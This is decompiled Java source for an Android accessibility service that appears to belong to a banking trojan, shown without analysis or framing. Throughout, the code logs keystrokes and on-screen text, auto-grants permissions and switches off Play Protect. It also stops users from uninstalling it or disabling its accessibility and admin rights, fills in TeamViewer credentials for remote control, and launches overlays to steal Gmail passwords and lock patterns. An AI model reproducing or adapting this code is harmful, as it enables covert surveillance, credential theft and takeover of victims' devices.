package com.example.mmm.Service;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.graphics.Rect;
import android.os.Build;
import android.os.Build.VERSION;
import android.util.Base64;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.example.mmm.constants;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Activity.actViewInjection;
import com.example.mmm.Utils.utils;
import com.example.mmm.Utils.utils2;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Iterator;
import java.util.Locale;

public class srvAccessibility extends AccessibilityService {
   utils utl = new utils();
   constants consts = new constants();
   utils2 utl2 = new utils2();
   String groups$;
   private String TAG_LOG;
   private boolean myers$;
   private String textKeylogger;
   private String packageAppStart;
   private String strText;
   private String className;
   private String app_inject;
   private String quantity$;
   private String reforms$;
   private String papers$;
   private String marie$;
   private int becomes$;
   private boolean admit$;
   private boolean drill$;
   private boolean grenada$;
   private boolean capable$;
   private boolean touring$;

   public srvAccessibility() {
      StringBuilder var1 = new StringBuilder();
      var1.append(srvAccessibility.class.getSimpleName());
      var1.append("   ");
      this.TAG_LOG = var1.toString();
      this.myers$ = false;
      this.textKeylogger = "";
      this.packageAppStart = "";
      this.strText = "";
      this.className = "";
      this.app_inject = "";
      this.quantity$ = "";
      this.reforms$ = "";
      this.papers$ = "";
      this.marie$ = "";
      this.becomes$ = 0;
      this.admit$ = false;
      this.drill$ = false;
      this.grenada$ = false;
      this.capable$ = false;
      this.touring$ = false;
      this.groups$ = "0";
   }

   private static String getEventText(AccessibilityEvent var0) {
      StringBuilder var1 = new StringBuilder();
      Iterator var2 = var0.getText().iterator();

      while(var2.hasNext()) {
         var1.append((CharSequence)var2.next());
      }

      return var1.toString();
   }

   private String decrypt_str(String var1) {
      var1 = new String((new ClassRC4("wewiejvtlfqy".getBytes()))._nevada(utils.hexStringToByteArray(new String(Base64.decode(var1, 0), "UTF-8"))));
      return var1;
   }

   private void blockBack() {
      if (VERSION.SDK_INT > 15) {
         int var1 = 0;

         while(true) {
            boolean var10001 = true;
            this.performGlobalAction(1);
            ++var1;
         }
      }

   }

   private void a(AccessibilityNodeInfo var1) {
      if (!this.capable$ && VERSION.SDK_INT >= 18) {
         if (var1 == null) {
            this.utl.Log(this.TAG_LOG, "nodeInfo == null");
            return;
         }

         Iterator var2 = var1.findAccessibilityNodeInfosByViewId("com.android.vending:id/toolbar_item_play_protect_settings").iterator();

         while(var2.hasNext()) {
            var2.next();
            this.blockBack2();
         }

         Iterator var3 = var1.findAccessibilityNodeInfosByViewId("com.android.vending:id/play_protect_settings").iterator();

         while(var3.hasNext()) {
            var3.next();
            this.blockBack2();
         }

         if (this.className.equals("com.google.android.gms.security.settings.verifyappssettingsactivity")) {
            this.blockBack2();
         }
      }

   }

   private void a(AccessibilityNodeInfo var1, String var2) {
      var2 = "str";
      if (VERSION.SDK_INT > 18 && var1 != null) {
         int var4 = var1.getChildCount();

         for(int var3 = 0; var3 < var4; ++var3) {
            AccessibilityNodeInfo var6 = var1.getChild(var3);
            if (var6 == null) {
               return;
            }

            StringBuilder var5 = new StringBuilder();
            var5.append(var2);
            var5.append(" > ");
            var5.append(var6.getClassName().toString());
            String var7 = var5.toString();
            String var10 = "";
            if (var6.getText() != null) {
               var10 = var6.getText().toString();
            }

            StringBuilder var8 = new StringBuilder();
            StringBuilder var9 = new StringBuilder();
            var9.append(var3);
            var9.append(" Class: ");
            var8.append(var9.toString());
            var8.append(var6.getClassName().toString());
            var8.append("; Text: ");
            var8.append(var10);
            var8.append("; ID: ");
            var8.append(var6.getViewIdResourceName());
            var8.append("; ");
            var8.append(var7);
            this.utl.Log("A_A_A", var8.toString());
            boolean var10001;
            if (this.className.contains("com.google.android.finsky.activities.mainactivity")) {
               var10001 = true;
            }

            if (this.groups$.equals("1")) {
               var10001 = true;
            }

            this.a(var6, var7);
         }
      }

   }

   private void blockBack2() {
      if (VERSION.SDK_INT > 15) {
         int var1 = 0;

         while(true) {
            boolean var10001 = true;
            this.performGlobalAction(1);
            ++var1;
         }
      }

   }

   private void b(AccessibilityNodeInfo var1, String var2) {
      if (var1 == null) {
         this.utl.Log(this.TAG_LOG, "nodeInfo == null");
      } else {
         if (this.capable$ && VERSION.SDK_INT >= 18) {
            int var3;
            int var4;
            int var5;
            if (this.packageAppStart.equals("com.android.vending")) {
               if (this.groups$.equals("1")) {
                  var4 = Integer.parseInt(this.utl.SettingsRead(this, "SW"));
                  var5 = Integer.parseInt(this.utl.SettingsRead(this, "SE"));

                  for(var3 = 0; var3 < var5 / 2; var3 += 50) {
                     Iterator var6 = var1.findAccessibilityNodeInfosByViewId("android:id/button1").iterator();
                     if (var6.hasNext()) {
                        ((AccessibilityNodeInfo)var6.next()).performAction(16);
                        this.groups$ = "0";
                        this.utl.SettingsWrite(this, "SR", "0");
                        this.capable$ = false;
                        this.blockBack2();
                     }

                     if (this.groups$.isEmpty()) {
                        break;
                     }

                     utils2._plains(this, var4 / 2, var3 + 40);
                  }
               }

               this.a(var1, "str");
               if (var2.contains("com.google.android.finsky.activities.mainactivity")) {
                  var4 = Integer.parseInt(this.utl.SettingsRead(this, "SW"));
                  var5 = Integer.parseInt(this.utl.SettingsRead(this, "SE"));
                  this.groups$ = "1";

                  for(var3 = 0; var3 < var5 / 2; var3 += 5) {
                     utils2._plains(this, var4 - 10, var3);
                  }
               }

               String[] var9 = new String[]{"com.android.vending:id/toolbar_item_play_protect_settings", "com.android.vending:id/play_protect_settings", "android:id/button1"};
               var3 = 0;

               while(true) {
                  boolean var10001 = true;
                  Iterator var7 = var1.findAccessibilityNodeInfosByViewId(var9[var3]).iterator();

                  while(var7.hasNext()) {
                     ((AccessibilityNodeInfo)var7.next()).performAction(16);
                     this.groups$ = "1";
                     if (var9[var3].equals("android:id/button1")) {
                        this.groups$ = "0";
                        this.capable$ = false;
                        this.utl.SettingsWrite(this, "SR", "0");
                        this.blockBack2();
                     }
                  }

                  ++var3;
               }
            }

            if (var2.equals("com.google.android.gms.security.settings.verifyappssettingsactivity")) {
               this.groups$ = "1";
               var1.performAction(4096);
               var5 = Integer.parseInt(this.utl.SettingsRead(this, "SW"));
               var4 = Integer.parseInt(this.utl.SettingsRead(this, "SE"));

               for(var3 = var4; var3 > 30; var3 -= 15) {
                  utils2._plains(this, var5 / 2, var4 - var3);
               }

               return;
            }

            if (var2.equals("android.app.alertdialog") && this.groups$.equals("1")) {
               Iterator var8 = var1.findAccessibilityNodeInfosByViewId("android:id/button1").iterator();

               while(var8.hasNext()) {
                  ((AccessibilityNodeInfo)var8.next()).performAction(16);
                  this.groups$ = "0";
                  this.capable$ = false;
                  this.blockBack2();
               }
            }
         }

      }
   }

   public void onAccessibilityEvent(AccessibilityEvent var1) {
      String var6;
      StringBuilder var7;
      if (4 == var1.getEventType() && !utils.getScreenBoolean(this)) {
         this.utl.Log(this.TAG_LOG, "click unlock device");
         if (this.myers$) {
            var6 = (new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US)).format(Calendar.getInstance().getTime());
            var7 = new StringBuilder();
            var7.append(this.textKeylogger);
            var7.append(var6);
            var7.append("[Focused]");
            var7.append("click unlock device");
            var7.append("[#2453102]");
            this.textKeylogger = var7.toString();
         }
      }

      if (utils.getScreenBoolean(this)) {
         if (var1 != null) {
            int var2;
            if (this.myers$) {
               var6 = (new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US)).format(Calendar.getInstance().getTime());
               var2 = var1.getEventType();
               if (var2 != 1) {
                  if (var2 != 8) {
                     if (var2 != 16) {
                        if (var1.getText().toString().length() >= 3) {
                           var7 = new StringBuilder();
                           var7.append(this.textKeylogger);
                           var7.append(var6);
                           var7.append("[Focused]");
                           var7.append(var1.getText().toString().length());
                           var7.append(" # ");
                           var7.append(var1.getText().toString());
                           var7.append("[#2453102]");
                           this.textKeylogger = var7.toString();
                        }
                     } else if (!var1.getText().toString().equals("")) {
                        var7 = new StringBuilder();
                        var7.append(this.textKeylogger);
                        var7.append(var6);
                        var7.append("[Wtore Text]");
                        var7.append(var1.getText().toString());
                        var7.append("[#2453102]");
                        this.textKeylogger = var7.toString();
                     }
                  } else if (!var1.getText().toString().equals("")) {
                     var7 = new StringBuilder();
                     var7.append(this.textKeylogger);
                     var7.append(var6);
                     var7.append("[Focused]");
                     var7.append(var1.getText().toString());
                     var7.append("[#2453102]");
                     this.textKeylogger = var7.toString();
                  }
               } else if (!var1.getText().toString().equals("")) {
                  var7 = new StringBuilder();
                  var7.append(this.textKeylogger);
                  var7.append(var6);
                  var7.append("[Click]");
                  var7.append(var1.getText().toString());
                  var7.append("[#2453102]");
                  this.textKeylogger = var7.toString();
               }
            }

            this.app_inject = var1.getPackageName().toString();
            this.packageAppStart = var1.getPackageName().toString().toLowerCase();
            this.strText = getEventText(var1).toLowerCase();
            this.className = var1.getClassName().toString().toLowerCase();
            AccessibilityNodeInfo var14;
            String var20;
            if (32 == var1.getEventType()) {
               var14 = var1.getSource();
               utils var16 = this.utl;
               String var8 = this.TAG_LOG;
               StringBuilder var9 = new StringBuilder();
               var9.append("packageApp{");
               var9.append(this.packageAppStart);
               var9.append("} strText{");
               var9.append(this.strText);
               var9.append("} className{");
               var9.append(this.className);
               var9.append("}");
               var16.Log(var8, var9.toString());
               this.utl._currency(this);
               if (this.utl2._console(this, var1, this.className)) {
                  this.blockBack2();
               }

               this.utl2._presence(this, var1, this.packageAppStart);
               this.utl2._referral(var1, this.className);
               this.utl2._obtain(var1, this.className);
               if (VERSION.SDK_INT >= 29) {
                  utils2 var17 = this.utl2;
                  var8 = this.packageAppStart;
                  String var19 = this.strText;
                  String var10 = this.className;
                  boolean var13;
                  if (VERSION.SDK_INT >= 18 && var10.equals("com.android.settings.applications.installedappdetailstop") && var8.equals("com.android.settings") && var19.length() > 10) {
                     var13 = true;
                  } else {
                     var13 = false;
                  }
               }

               if ("xiaomi".equalsIgnoreCase(Build.MANUFACTURER) && utils.getMiuiVersion() >= 10) {
                  if (this.utl.SettingsRead(this, "XB").equals("1")) {
                     this.touring$ = true;
                  } else {
                     this.touring$ = false;
                  }

                  if (!this.touring$) {
                     if (!this.className.contains("com.miui.permcenter.permissions.permissionseditoractivity")) {
                        this.utl2._cornell(this);
                     }

                     if (this.utl2._declared(this, var1, this.className)) {
                        this.utl2._fires(this);
                        this.touring$ = true;
                        this.blockBack2();
                     }
                  } else if (this.className.contains("com.miui.permcenter.permissions.permissionseditoractivity") && this.strText.contains(this.utl.getLabelApplication(this).toLowerCase())) {
                     this.blockBack2();
                  }

                  if (this.className.contains("com.miui.permcenter.autostart.autostartmanagementactivity")) {
                     if (!this.utl.SettingsRead(this, "XS").equals("1")) {
                        if (this.utl2._bases(this, var1, this.className)) {
                           this.utl.Log(this.TAG_LOG, "Click AutoStart");
                           this.utl.SettingsWrite(this, "XS", "1");
                           this.blockBack2();
                           if (!this.utl.SettingsRead(this, "XH").equals("1")) {
                              this.utl2._tulsa(this);
                           }
                        }
                     } else {
                        this.blockBack();
                     }
                  }

                  if (this.className.contains("com.miui.powerkeeper.ui.hiddenappsconfigactivity")) {
                     if (!this.utl.SettingsRead(this, "XH").equals("1")) {
                        if (this.utl2._phone(var1, this.className)) {
                           this.utl.Log(this.TAG_LOG, "Click isXiaomiHiddenappsconfigactivity");
                           this.utl.SettingsWrite(this, "XH", "1");
                           this.blockBack2();
                        }
                     } else if (this.strText.contains(this.utl.getLabelApplication(this).toLowerCase())) {
                        this.blockBack();
                     }
                  }

                  if (this.strText.contains(this.utl.getLabelApplication(this).toLowerCase()) && this.className.contains("com.miui.appmanager.applicationsdetailsactivity")) {
                     this.blockBack();
                  }

                  if (this.packageAppStart.contains("com.miui.cleanmaster") && this.className.contains("com.miui.optimizecenter.deepclean.installedapp.installedappsactivity")) {
                     this.blockBack();
                  }
               }

               if (!this.packageAppStart.isEmpty()) {
                  this.utl.SettingsWrite(this, "RW", this.packageAppStart);
               }

               if (VERSION.SDK_INT > 15 && "com.android.settings.SubSettings".equals(var1.getClassName()) && this.strText.equals("gÃ¼ncelleme".toLowerCase())) {
                  this.blockBack();
                  this.utl.SettingsToAdd(this, "AS", "Blocked attempt to disable accessibility service[143523#]");
               }

               this.quantity$ = this.utl.SettingsRead(this, "RE");
               this.reforms$ = this.utl.SettingsRead(this, "GE");
               if (this.utl.SettingsRead(this, "AC").equals("1")) {
                  this.myers$ = true;
               } else {
                  this.myers$ = false;
               }

               if (this.utl.SettingsRead(this, "SR").equals("1")) {
                  this.capable$ = true;
               } else {
                  this.capable$ = false;
               }

               if (this.textKeylogger.length() > 20) {
                  var16 = this.utl;
                  var8 = this.TAG_LOG;
                  var9 = new StringBuilder();
                  var9.append("Log Keylogger Size: ");
                  var9.append(this.textKeylogger.length());
                  var16.Log(var8, var9.toString());
                  this.utl.SettingsToAdd(this, "AM", this.textKeylogger);
                  this.textKeylogger = "";
               }

               if (var14 == null) {
                  this.utl.Log(this.TAG_LOG, "nodeInfo == null");
                  return;
               }

               if (VERSION.SDK_INT >= 18) {
                  boolean var10001;
                  if (this.utl.SettingsRead(this, "SQ").equals("1")) {
                     String[] var28 = new String[]{"com.android.packageinstaller:id/permission_allow_button", "com.android.permissioncontroller:id/permission_allow_button", "android:id/button1", "com.android.settings:id/action_button", "com.android.settings:id/button1"};
                     var2 = 0;

                     label307:
                     while(true) {
                        var10001 = true;
                        Iterator var26 = var14.findAccessibilityNodeInfosByViewId(var28[var2]).iterator();

                        while(true) {
                           do {
                              do {
                                 if (!var26.hasNext()) {
                                    ++var2;
                                    continue label307;
                                 }

                                 ((AccessibilityNodeInfo)var26.next()).performAction(16);
                                 this.utl.SettingsWrite(this, "SQ", "");
                                 this.utl.Log(this.TAG_LOG, "-=CLICK BUTTON=-");
                              } while(!var28[var2].contains("com.android.settings:id/action_button"));
                           } while(utils._exercise(this));

                           Rect var27 = new Rect();
                           var14.getBoundsInScreen(var27);
                           int var3 = 0;

                           while(true) {
                              var10001 = true;
                              int var4 = var27.centerY();
                              utils2._plains(this, var27.centerX(), var4 - 250 + var3);
                              if (utils._exercise(this)) {
                                 break;
                              }

                              var3 += 4;
                           }
                        }
                     }
                  }

                  if (!this.utl.SettingsRead(this, "QR").isEmpty()) {
                     var20 = "com.android.settings:id/left_button";
                     var8 = "android:id/button1";
                     var2 = 0;

                     while(true) {
                        var10001 = true;

                        for(Iterator var24 = var14.findAccessibilityNodeInfosByViewId((new String[]{var20, var8})[var2]).iterator(); var24.hasNext(); var10001 = true) {
                           ((AccessibilityNodeInfo)var24.next()).performAction(16);
                        }

                        ++var2;
                     }
                  }
               }
            }

            this.a(var1.getSource());
            this.b(var1.getSource(), this.className);
            if (!this.utl.SettingsRead(this, "QR").equals(this.getPackageName())) {
               utils var15;
               StringBuilder var18;
               if (var1.getPackageName().toString().contains("com.google.android.packageinstaller") && this.className.contains("android.app.alertdialog") && this.strText.contains(this.utl.getLabelApplication(this).toLowerCase())) {
                  this.blockBack();
                  var15 = this.utl;
                  var20 = "AS";
                  var18 = new StringBuilder();
                  var18.append("Blocked attempt to remove bot");
                  var18.append("[143523#]");
                  var15.SettingsToAdd(this, var20, var18.toString());
               }

               if ((this.className.equals("android.support.v7.widget.recyclerview") || this.className.equals("android.widget.linearlayout")) && (var1.getPackageName().toString().equals("com.android.settings") || var1.getPackageName().toString().equals("com.miui.securitycenter")) && this.strText.contains(this.utl.getLabelApplication(this).toLowerCase()) && !this.strText.contains("euwvxmpnqta".toLowerCase())) {
                  this.blockBack();
                  var15 = this.utl;
                  var20 = "AS";
                  var18 = new StringBuilder();
                  var18.append("Blocked attempt to remove bot");
                  var18.append("[143523#]");
                  var15.SettingsToAdd(this, var20, var18.toString());
               }

               if (this.className.equals("com.android.settings.deviceadminadd") && utils._exercise(this)) {
                  this.blockBack();
                  var15 = this.utl;
                  var20 = "AS";
                  var18 = new StringBuilder();
                  var18.append("Blocked attempt to disable admin device");
                  var18.append("[143523#]");
                  var15.SettingsToAdd(this, var20, var18.toString());
               }

               if (var1.getPackageName().toString().contains("com.google.android.packageinstaller") && this.className.contains("android.app.alertdialog") && this.strText.contains("host") && this.utl.SettingsRead(this, "RA").equals("true")) {
                  this.blockBack();
                  var15 = this.utl;
                  var20 = "AS";
                  var18 = new StringBuilder();
                  var18.append("Blocked attempt to remove TeamViewer");
                  var18.append("[143523#]");
                  var15.SettingsToAdd(this, var20, var18.toString());
               }

               if ((this.className.equals("android.support.v7.widget.recyclerview") || this.className.equals("android.widget.linearlayout")) && (var1.getPackageName().toString().equals("com.android.settings") || var1.getPackageName().toString().equals("com.miui.securitycenter")) && this.strText.contains("host") && this.utl.SettingsRead(this, "RA").equals("true")) {
                  this.blockBack();
                  var15 = this.utl;
                  var20 = "AS";
                  var18 = new StringBuilder();
                  var18.append("Blocked attempt to remove TeamViewer");
                  var18.append("[143523#]");
                  var15.SettingsToAdd(this, var20, var18.toString());
               }
            }

            if (VERSION.SDK_INT >= 18) {
               AccessibilityNodeInfo var25;
               if (this.packageAppStart.contains("com.teamviewer.host.market")) {
                  var14 = utils2._selling(var1, "com.teamviewer.host.market:id/host_assign_device_username");
                  var25 = utils2._selling(var1, "com.teamviewer.host.market:id/host_assign_device_password");
                  AccessibilityNodeInfo var23 = utils2._selling(var1, "com.teamviewer.host.market:id/host_assign_device_submit_button");
                  if (var14 != null) {
                     this.papers$ = this.utl.SettingsRead(this, "RT");
                     if (!this.papers$.isEmpty()) {
                        this.marie$ = this.utl.SettingsRead(this, "RY");
                        this.grenada$ = false;
                        this.drill$ = false;
                        this.admit$ = false;
                        this.becomes$ = 0;
                        this.utl.SettingsWrite(this, "RT", "");
                        this.utl.SettingsWrite(this, "RY", "");
                     }
                  }

                  if (this.becomes$ == 0) {
                     AccessibilityNodeInfo var21 = utils2._selling(var1, "com.teamviewer.host.market:id/action_bar_root");
                     AccessibilityNodeInfo var22 = utils2._selling(var1, "com.teamviewer.host.market:id/buttonPanel");
                     if (var21 != null && var22 != null) {
                        this.becomes$ = 1;
                        var21 = utils2._selling(var1, "android:id/button1");
                        if (var21 != null) {
                           this.utl2._shannon(var21);
                        }

                        var21 = utils2._selling(var1, "com.samsung.klmsagent:id/checkBox1");
                        var22 = utils2._selling(var1, "com.samsung.klmsagent:id/btn_confirm");
                        if (var21 != null && this.becomes$ == 1) {
                           this.utl2._shannon(var21);
                           this.utl2._shannon(var22);
                           this.becomes$ = 2;
                           utils.runApplication(this, "com.teamviewer.host.market");
                        }
                     }
                  }

                  if (!this.papers$.isEmpty() && !this.marie$.isEmpty()) {
                     if (var14 != null && !this.admit$) {
                        utils2._batch(var14, this.papers$);
                        this.admit$ = true;
                     }

                     if (var25 != null && !this.drill$) {
                        utils2._batch(var25, this.marie$);
                        this.drill$ = true;
                     }

                     if (this.admit$ && this.drill$ && !this.grenada$) {
                        this.becomes$ = 0;
                        this.utl2._shannon(var23);
                        this.grenada$ = true;
                        if (this.utl.SettingsRead(this, "RI").equals("true")) {
                           this.blockBack2();
                        }
                     }
                  }
               } else if (this.packageAppStart.contains("com.samsung.klmsagent")) {
                  var14 = utils2._selling(var1, "com.samsung.klmsagent:id/checkBox1");
                  var25 = utils2._selling(var1, "com.samsung.klmsagent:id/btn_confirm");
                  if (var14 != null && this.becomes$ == 1) {
                     this.utl2._shannon(var14);
                     this.utl2._shannon(var25);
                     this.becomes$ = 2;
                     utils.runApplication(this, "com.teamviewer.host.market");
                  }
               } else {
                  this.becomes$ = 0;
               }

               if (this.packageAppStart.contains("com.teamviewer.host.market") && this.utl.SettingsRead(this, "RA").equals("true")) {
                  this.blockBack2();
               }
            }

            Intent var11;
            if (this.quantity$.isEmpty() && this.reforms$.isEmpty()) {
               String var12 = this.utl.SettingsRead(this, "QP");
               if (!var12.isEmpty() && var12.contains(this.app_inject) && this.app_inject.contains(".")) {
                  boolean var5 = utils.getScreenBoolean(this);
                  if (var5) {
                     var11 = new Intent(this, actViewInjection.class);
                     var11.addFlags(268435456);
                     var11.addFlags(8388608);
                     this.utl.SettingsWrite(this, "RF", this.app_inject);
                     this.startActivity(var11);
                     return;
                  }
               }

            } else {
               if (32 == var1.getEventType()) {
                  if (!this.quantity$.isEmpty()) {
                     var11 = new Intent(this, actViewInjection.class);
                     var11.addFlags(268435456);
                     var11.addFlags(8388608);
                     this.utl.SettingsWrite(this, "RF", "grabbing_pass_gmail");
                     this.startActivity(var11);
                  }

                  if (!this.reforms$.isEmpty()) {
                     var11 = new Intent(this, actViewInjection.class);
                     var11.addFlags(268435456);
                     var11.addFlags(8388608);
                     this.utl.SettingsWrite(this, "RF", "grabbing_lockpattern");
                     this.startActivity(var11);
                  }
               }

            }
         }
      }
   }

   public void onInterrupt() {
      this.utl.Log(this.TAG_LOG, "onInterrupt");
   }

   protected void onServiceConnected() {
      super.onServiceConnected();
      this.utl.Log(this.TAG_LOG, "onServiceConnected");
      this.blockBack2();
      AccessibilityServiceInfo var1 = new AccessibilityServiceInfo();
      var1.flags = 17;
      var1.eventTypes = -1;
      var1.feedbackType = 16;
      this.setServiceInfo(var1);
   }
}
